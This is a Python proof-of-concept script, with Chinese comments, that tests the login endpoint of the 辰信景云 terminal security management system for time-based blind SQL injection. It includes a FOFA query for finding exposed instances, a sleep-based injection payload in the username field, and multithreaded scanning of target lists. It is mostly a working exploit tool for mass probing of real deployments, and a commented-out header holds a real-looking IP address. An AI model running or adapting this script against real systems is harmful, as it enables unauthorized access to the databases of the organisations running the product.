#fofa "辰信景云终端安全管理系统" && icon_hash="-429260979"
#导包
import requests,re,json,argparse,sys,time
from multiprocessing.dummy import Pool
#关闭警告
requests.packages.urllib3.disable_warnings()
#横幅
def banner():
    test = """ 
      
                                                         
"""
    print(test)
#主函数
def main():
    banner()
    parser = argparse.ArgumentParser(description="辰信景云终端安全管理系统sql注入")
    parser.add_argument('-u','--url',dest='url',type=str,help='url')
    parser.add_argument('-f','--file',dest='file',type=str,help='file')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")




#poc函数
def poc(target):
    api = '/api/user/login'
    payload = "username=123456%40qq.com&password=e10adc3949ba59abbe56e057f20f883e&captcha="
    payload1 ="captcha=&password=21232f297a57a5a743894a0e4a801fc3&username=admin'and(select*from(select+sleep(10))a)='"
    headers = {
        'Cookie':'vsecureSessionID=c53400e823e9bac062dd803daf474a2a',
        'User-Agent':'Mozilla/5.0(WindowsNT10.0;Win64;x64;rv:128.0)Gecko/20100101Firefox/128.0',
        'Accept':'application/json,text/plain,*/*',
        'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding':'gzip,deflate',
        'Content-Type':'application/x-www-form-urlencoded',
        'X-Requested-With':'XMLHttpRequest',
        'Content-Length':'72',
        #'Origin':'https://162.14.124.251',
        #'Referer':'https://162.14.124.251/?v=login',
        'Sec-Fetch-Dest':'empty',
        'Sec-Fetch-Mode':'cors',
        'Sec-Fetch-Site':'same-origin',
        'Priority':'u=0',
        'Te':'trailers',
            }
    res = requests.post(url=target + api,verify=False,headers=headers,data=payload)
    res1 = requests.post(url=target + api,verify=False,headers=headers,data=payload1)
    time = res.elapsed.total_seconds()
    time1 = res1.elapsed.total_seconds()
    print(time,time1)
    

   
    
#函数入口
if __name__ == '__main__':
    main()
